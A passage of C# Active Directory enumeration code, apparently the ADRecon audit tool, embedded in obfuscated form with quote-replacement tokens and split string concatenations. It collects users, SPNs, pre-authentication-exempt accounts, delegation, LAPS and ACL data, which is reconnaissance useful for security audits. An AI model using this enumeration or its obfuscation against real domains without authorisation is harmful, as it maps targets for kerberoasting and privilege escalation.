                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case I2ajDomainControllersI2aj:
                    return new DomainControllerRecordProcessor();
                case I2ajSchemaHistoryI2aj:
                    return new SchemaRecordProcessor();
                case I2ajUsersI2aj:
                    return new UserRecordProcessor();
                case I2ajUserSPNsI2aj:
                    return new UserSPNRecordProcessor();
                case I2ajGroupsI2aj:
                    return new GroupRecordProcessor();
                case I2ajGroupChangesI2aj:
                    return new GroupChangeRecordProcessor();
                case I2ajGroupsDictionaryI2aj:
                    return new GroupRecordDictionaryProcessor();
                case I2ajGroupMembersI2aj:
                    return new GroupMemberRecordProcessor();
                case I2ajOUsI2aj:
                    return new OURecordProcessor();
                case I2ajGPOsI2aj:
                    return new GPORecordProcessor();
                case I2ajGPOsDictionaryI2aj:
                    return new GPORecordDictionaryProcessor();
                case I2ajSOMsI2aj:
                    return new SOMRecordProcessor();
                case I2ajPrintersI2aj:
                    return new PrinterRecordProcessor();
                case I2ajComputersI2aj:
                    return new ComputerRecordProcessor();
                case I2ajComputerSPNsI2aj:
                    return new ComputerSPNRecordProcessor();
                case I2ajLAPSI2aj:
                    return new LAPSRecordProcessor();
                case I2ajSIDDictionaryI2aj:
                    return new SIDRecordDictionaryProcessor();
                case I2ajDACLsI2aj:
                    return new DACLRecordProcessor();
                case I2ajSACLsI2aj:
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException(I2ajInvalid processor type I2aj + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    System.DirectoryServices.ActiveDirectory.DomainController AdDC = (System.DirectoryServices.ActiveDirectory.DomainController) record;
                    bool? Infra = false;
                    bool? Naming = false;
                    bool? Schema = false;
                    bool? RID = false;
                    bool? PDC = false;
                    string Domain = null;
                    string Site = null;
                    string OperatingSystem = null;
                    PSObject DCSMBObj = new PSObject();

                    try
                    {
                        Domain = AdDC.Domain.ToString();
                        foreach (var OperationMasterRole in (System.DirectoryServices.ActiveDirectory.ActiveDirectoryRoleCollection) AdDC.Roles)
                        {
                            switch (OperationMasterRole.ToString())
                            {
                                case I2ajInfrastructureRoleI2aj:
                                Infra = true;
                                break;
                                case I2ajNamingRoleI2aj:
                                Naming = true;
                                break;
                 '+'               case I2ajSchemaRoleI2aj:
                                Schema = true;
                                break;
                                case I2ajRidRoleI2aj:
                                RID = true;
                                break;
                                case I2ajPdcRoleI2aj:
                                PDC = true;
                                break;
                            }
                        }
                        Site = AdDC.SiteName;
                        OperatingSystem = AdDC.OSVersion.ToString();
                    }
                    catch (System.DirectoryServices.ActiveDirectory.ActiveDirectoryServerDownException)// e)
                    {
                        //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                        Infra = null;
                        Naming = null;
                        Schema = null;
                        RID = null;
                        PDC = null;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty(I2ajDomainI2aj, Domain));
                    DCObj.Members.Add(new PSNoteProperty(I2ajSiteI2aj, Site));
                    DCObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, Convert.ToString(AdDC.Name).Split(JQTOy.JQTOy)[0]));
                    DCObj.Members.Add(new PSNoteProperty(I2ajIPv4AddressI2aj, AdDC.IPAddress));
                    DCObj.Members.Add(new PSNoteProperty(I2ajOperating SystemI2aj, OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty(I2ajHostnameI2aj, AdDC.Name));
                    DCObj.Members.Add(new PSNoteProperty(I2ajInfraI2aj, Infra));
                    DCObj.Members.Add(new PSNoteProperty(I2ajNamingI2aj, Naming));
                    DCObj.Members.Add(new PSNoteProperty(I2ajSchemaI2aj, Schema));
                    DCObj.Members.Add(new PSNoteProperty(I2ajRIDI2aj, RID));
                    DCObj.Members.Add(new PSNoteProperty(I2ajPDCI2aj, PDC));
                    if (AdDC.IPAddress != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.IPAddress);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB Port OpenI2aj, false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Pr'+'operties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == I2ajSMB Port OpenI2aj && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB1(NT LM 0.12)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0202)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0210)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0300)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0302)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0311)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB SigningI2aj, null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPrope'+'rtyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSchema = (SearchResult) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajObjectClassI2aj, AdSchema.Properties[I2ajobjectclassI2aj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdSchema.Properti'+'es[I2ajnameI2aj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdSchema.Properties[I2ajwhencreatedI2aj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdSchema.Properties[I2ajwhenchangedI2aj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdSchema.Properties[I2ajdistinguishednameI2aj][0]));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
           '+'         bool? Enabled = '+'null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    string SIDHistory = I2ajI2aj;
                    bool? HasSPN = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties[I2ajuseraccountcontrolI2aj].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties[I2ajuseraccountcontrolI2aj][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
             '+'           PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PRE'+'AUTH;
                    }
                    if (AdUser.Properties[I2ajmsds-supportedencryptiontypesI2aj].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties[I2ajmsds-supportedencryptiontypesI2aj][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties[I2ajntsecuritydescriptorI2aj].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties[I2ajntsecuritydescriptorI2aj][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection'+' AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals(I2ajab721a53-1e2f-11d0-9819-00aa0040529bI2aj))
                            {
                                if (Rule.AccessControlType.ToString() == I2ajDenyI2aj)
                                {
                                    string ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == I2ajEveryoneI2aj)
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == I2ajNT AUTHORITYCOlhgCOlhgSELFI2aj)
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
    '+'                    else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties[I2ajlastlogontimestampI2aj].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties[I2ajlastlogontimestampI2aj][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (D'+'aysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties[I2ajpwdLastSetI2aj].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties[I2ajpwdlastsetI2aj][0]) == I2aj0I2aj)
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
   '+'                         }
         '+'               }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties[I2ajpwdlastsetI2aj][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if (AdUser.Properties[I2ajaccountExpiresI2aj].Count != 0)
                    {
                        if ((Int64) AdUser.Properties[I2ajaccountExpiresI2aj][0] != (Int64) 9223372036854775807)
                        {
                            if ((Int64) AdUser.Properties[I2ajaccountExpiresI2aj][0] != (Int64) 0)
                            {
                                try
                                {
                                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                    AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties[I2ajaccountExpiresI2aj][0]));
                                    AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                                }
                                catch //(Exception e)
                                {
                                    //    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                                }
                            }
                        }
                    }
                    if (AdUser.Properties[I2ajuseraccountcontrolI2aj].Count != 0)
                    {
                        if ((bool) TrustedforDelegation)
                        {
                            DelegationType = I2ajUnconstrainedI2aj;
                            DelegationServices = I2ajAnyI2aj;
                        }
                        if (AdUser.Properties[I2ajmsDS-AllowedToDelegateToI2aj].Count >= 1)
                        {
                            DelegationType = I2ajConstrainedI2aj;
                            for (int i = 0; i < AdUser.Properties[I2ajmsDS-AllowedToDelegateToI2aj].Count; i++)
                            {
                                var delegateto = AdUser.Properties[I2ajmsDS-AllowedToDelegateToI2aj][i];
                                DelegationServices = DelegationServices + I2aj,I2aj + Convert.ToString(delegateto);
                            }
                            DelegationServices = DelegationServices.TrimStart(JQTOy,JQTOy);
                        }
                        if ((bool) TrustedtoAuthforDelegation)
                        {
                            DelegationProt'+'ocol = I2ajAnyI2aj;
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = I2ajKerberosI2aj;
                        }
                    }
                    if (AdUser.Properties[I2ajsidhistoryI2aj].Count >= 1)
                    {
                        string sids = I2ajI2aj;
                        for (int i = 0; i < AdUser.Properties[I2ajsidhistoryI2aj].Count; i++)
                        {
                            var history = AdUser.Properties[I2ajsidhistoryI2aj][i];
                            sids = sids + I2aj,I2aj + Convert.ToString('+'new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(JQTOy,JQTOy);
                    }
                    if (AdUser.Properties[I2ajserviceprincipalnameI2aj].Count == 0)
                    {
                        HasSPN = false;
                    }
                    else if (AdUser.Properties[I2ajserviceprincipalnameI2aj].Count > 0)
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProp'+'erty(I2ajUserNameI2aj, (AdUser.Properties[I2ajsamaccountnameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajsamaccountnameI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, (AdUser.Properties[I2ajnameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajnameI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajEnabledI2aj, Enabled));
                    UserObj.Members.Add(new PSNoteProperty(I2ajMust Change Password at LogonI2aj, MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCannot Change PasswordI2aj, CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword Never ExpiresI2aj, PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty(I2ajReversible Password EncryptionI2aj, ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty(I2ajSmartcard Logon RequiredI2aj, SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDelegation PermittedI2aj, DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos DES OnlyI2aj, UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos RC4I2aj, KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos AES-128bitI2aj, KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos AES-256bitI2aj, KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDoes Not Require Pre AuthI2aj, DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty(I2ajNever Logged inI2aj, NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty(I2ajLogon Age (days)I2aj, DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword Age (days)I2aj, DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDormant (> I2aj + DormantTimeSpan + I2aj days)I2aj, Dormant));
             '+'       UserObj.Members.Add(new PSNoteProperty(I2ajPassword Age (> I2aj + PassMaxAge + I2aj days)I2aj, PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAccount Locked OutI2aj, Accoun'+'tLockedOut));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword ExpiredI2aj, PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword Not RequiredI2aj, PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDelegation TypeI2aj, DelegationType));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDelegation ProtocolI2aj, DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDelegation ServicesI2aj, DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty(I2ajLogon WorkstationsI2aj, (AdUser.Properties[I2ajuserworkstationsI2aj].Count != 0 ? AdUser.Properties[I2ajuserworkstationsI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAdminCountI2aj, (AdUser.Properties[I2ajadmincountI2aj].Count != 0 ? AdUser.Properties[I2ajadmincountI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPrimary GroupIDI2aj, (AdUser.Properties[I2ajprimarygroupidI2aj].Count != 0 ? AdUser.Properties[I2ajprimarygroupidI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajSIDI2aj, Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties[I2ajobjectSIDI2aj][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty(I2ajSIDHistoryI2aj, SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty(I2ajHasSPNI2aj, HasSPN));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, (AdUser.Properties[I2ajDescriptionI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajDescriptionI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajTitleI2aj, (AdUser.Properties[I2ajTitleI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajTitleI2aj][0]'+') : I2ajI2aj)));
                    '+'UserObj.Members.Add(new PSNoteProperty(I2ajDepartmentI2aj, (AdUser.Properties[I2ajDepartmentI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajDepartmen'+'tI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCompanyI2aj, (AdUser.Properties[I2ajCompanyI2a'+'j].Count != 0 ? CleanString(AdUser.Properties[I2ajCompanyI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSN'+'oteProperty(I2ajManagerI2aj, (AdUser.Properties[I2ajManagerI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajManagerI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajInfoI2aj, (AdUser.Properties[I2ajinfoI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajinfoI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajLast Logon DateI2aj, LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword LastSetI2aj, PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAccount Expiration DateI2aj, AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAccount Expiration (days)I2aj, AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty(I2ajMobileI2aj, (AdUser.Properties[I2ajmobileI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajmobileI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajEmailI2aj, (AdUser.Properties[I2ajmailI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajmailI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajHomeDirectoryI2aj, (AdUser.Properties[I2ajho'+'medirectoryI2aj].Count != 0 ? AdUser.Properties[I2ajhomedirectoryI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajProfilePathI2aj, (AdUser.Properties[I2ajprofilepathI2aj].Count != 0 ? AdUser.Properties[I2ajprofilepathI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajScriptPathI2aj, (AdUser.Properties[I2ajscriptpathI2aj].Count != 0 ? AdUser.Properties[I2ajscriptpathI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajUserAccountControlI2aj, (AdUser.Properties[I2ajuseraccountcontrolI2aj].Count != 0 ? AdUser.Properties[I2ajuseraccountcontrolI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajFirst NameI2aj, (AdUser.Properties[I2ajgivenNameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajgivenNameI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajMiddle NameI2aj, (AdUser.Properties[I2ajmiddleNameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajmiddleNameI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajLast NameI2aj, (AdUser.Properties[I2ajsnI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajsnI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCountryI2aj, (AdUser.Properties[I2ajcI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajcI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, (AdUser.Properties[I2ajwhencreatedI2aj].Count != 0 ? AdUser.Properties[I2ajwhencreatedI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add'+'(new PSNoteProperty(I2ajwhenChangedI2aj, (AdUser.Properties[I2ajwhenchangedI2aj].Count != 0 ? AdUser.Properties[I2ajwhenchangedI2aj][0] : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, (AdUser.Properties[I2ajdistinguishednameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajdistinguishednameI2aj][0]) : I2ajI2aj)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCanonicalNameI2aj, (AdUser.Properties[I2ajcanonicalnameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajcanonicalnameI2aj][0]) : I2ajI2aj)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    if (AdUser.Properties[I2ajserviceprincipalnameI2aj].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties[I2ajpwdlastsetI2aj].Count != 0)
                    {
                        if (Convert.ToStr'+'ing(AdUser.Properties[I2ajpwdlastsetI2aj][0]) != I2aj0I2aj)
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties[I2ajpwdLastSetI2aj][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties[I2ajuseraccountcontrolI2aj].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties[I2ajuseraccountcontrolI2aj][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    string Description = (AdUser.Properties[I2ajDescriptionI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajDescriptionI2aj][0]) : I2ajI2aj);
                    string PrimaryGroupID = (AdUser.Properties[I2ajprimarygroupidI2aj].Count != 0 ? Convert.ToString(AdUser.Properties[I2ajprimarygroupidI2aj][0]) : I2ajI2aj);
                    if (AdUser.Properties[I2ajmemberofI2aj].Count != 0)
                    {
                        foreach (string Member in AdUser.Properties[I2ajmemberofI2aj])
                        {
                            Memberof = Memberof + I2aj,I2aj + ((Convert.ToString(Member)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
           '+'             }
                        Memberof = Memberof.TrimStart(JQTOy,JQTOy);
                    }
                    foreach (string SPN in AdUser.Properties[I2ajserviceprincipalnameI2aj])
                    {
                        string[] SPNArray = SPN.Split(JQTOy/JQTOy);
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajUserNameI2aj, (AdUser.Properties[I2ajsamaccountnameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajsamaccountnameI2aj][0]) : I2ajI2aj)));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, (AdUser.Properties[I2ajnameI2aj].Count != 0 ? CleanString(AdUser.Properties[I2ajnameI2aj][0]) : I2ajI2aj)));
                        UserS'+'PNObj.Members.Add(new PSNoteProperty(I2ajEnabledI2aj, Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajServiceI2aj, SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajHostI2aj, SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajPassword Last SetI2aj, PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, Description));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajPrimary GroupIDI2aj, PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajMemberofI2aj, Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string ManagedByValue = AdGroup.Properties[I2ajmanagedbyI2aj].Count != 0 ? Convert.ToString(AdGroup.Properties[I2ajmanagedbyI2aj][0]) : I2ajI2aj;
                    string ManagedBy = I2ajI2aj;
                    string GroupCategory = null;
                    string GroupScope = null;
                    string SIDHistory = I2ajI2aj;

                    if (AdGroup.Properties[I2ajmanagedByI2aj].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { I2ajCN=I2aj },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { I2ajOU=I2aj },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(JQTOy,JQTOy);
                    }

                    if (AdGroup.Properties[I2ajgrouptypeI2aj].Count != 0)
                    {
